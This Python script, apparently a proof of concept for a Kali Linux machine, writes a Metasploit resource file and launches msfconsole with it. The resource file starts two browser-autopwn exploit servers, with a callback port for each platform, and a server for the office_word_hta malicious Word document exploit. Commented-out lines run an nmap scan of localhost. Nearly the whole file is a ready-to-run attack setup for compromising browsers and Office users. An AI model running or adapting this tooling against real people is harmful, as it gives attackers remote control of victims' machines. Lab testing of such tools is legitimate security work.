import socket
import os
import sys
import operator

# Change directory to something most Kali Boxes have in common
# /root/Documents/JKD_poc.py
os.chdir("/root/Documents")

# Static name for the resource script
resource_file_name = 'jkd_script.rc'
resource_file_name_2 = 'nmap_script.rc'

# write the resource file Ensuring that each exploit payload has its own
# dedicated port
jkd_msf_commands = """
echo \t\tTake your time, I am loading 3x Exploits
echo \t\tLoading Browser Autopwn #1
use auxiliary/server/browser_autopwn
setg lhost 0.0.0.0
set lport_win32 10002
set lport_linux 10003
set lport_macos 10004
set lport_generic 10005
set lport_android 10006
set lport_java 10007
set srvport 7070
run -j -z
echo \t\tLoading Browser Autopwn #2
use auxiliary/server/browser_autopwn2
setg LHOST 0.0.0.0
run -j -z
echo \t\tLoading Office Word HTA Evil File Server
use exploit/windows/fileformat/office_word_hta
options
set srvport 6060
advanced
set lport 11000
run -j -z
echo Wait at least 60 seconds please before running nmap command in a new terminal: \n\n\t\techo "nmap -sS -sU -T4 -A -v -PE -PP -PS80,443 -PA3389 -PU40125 -PY -g 53 --script=ssl-enum-ciphers 127.0.0.1:"
"""

# write the script real quick and then close the file
w = open(resource_file_name,'w')
w.write(jkd_msf_commands)
w.close()


# Start up Metasploit
# execute resource file

# print 'Waiting 120 seconds for the Metasploit modules to load before running the PoC scan'
# time.sleep(120)
# os.system("""gnome-terminal -e 'bash -c \"nmap -sS -sU -T4 -A -v -PE -PP -PS80,443 -PA3389 -PU40125 -PY -g 53 --script "default or (discovery and safe)" 127.0.0.1; exec bash\"'""")

os.system('service postgresql start')
os.system('service metasploit start')
os.system('msfdb init')
os.system('msfdb start')
cmd_str = "msfconsole -r {0}".format(str(resource_file_name))
os.system(cmd_str)

# print 'Waiting 120 seconds for the Metasploit modules to load before running the PoC scan'
# time.sleep(120)
# os.system("""gnome-terminal -e 'bash -c \"nmap -sS -sU -T4 -A -v -PE -PP -PS80,443 -PA3389 -PU40125 -PY -g 53 --script "default or (discovery and safe)" 127.0.0.1; exec bash\"'""")
# # time.sleep(60)
# # nmap_scan_content = "db_nmap -sS -sU -T4 -A -v -PE -PP -PS80,443 -PA3389 -PU40125 -PY -g 53 --script=ssl-enum-ciphers 127.0.0.1"
# # x = open(resource_file_name_2,'w')
# # x.write(nmap_scan_content)
# # x.close()
# # cmd_str = "msfconsole -r {0}".format(str(resource_file_name_2))
